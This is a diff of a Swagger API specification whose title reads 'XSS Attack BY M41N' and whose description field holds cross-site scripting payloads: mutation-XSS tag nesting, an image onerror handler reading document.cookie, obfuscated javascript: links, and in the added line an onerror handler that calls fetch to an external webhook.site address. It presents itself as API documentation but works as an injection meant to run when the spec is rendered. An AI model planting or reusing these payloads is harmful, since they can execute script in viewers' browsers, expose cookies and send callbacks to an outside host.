@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M41N
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1> &#x3C;script&#x3E;alert(1);&#x3C;/script&#x3E;<a+HREF=%27javascrip%26%239t:alert%26lpar;document.domain)%27>test</a><a%20href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;()&rpar;">Click</a>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1> <script>al%00ert(1)</script> <img src=1 onerror=fetch("https://webhook.site/a67a77e4-6121-40f6-b132-a788ecde325f")>"></form>
 
   version: production
 basePath: /JSSResource/
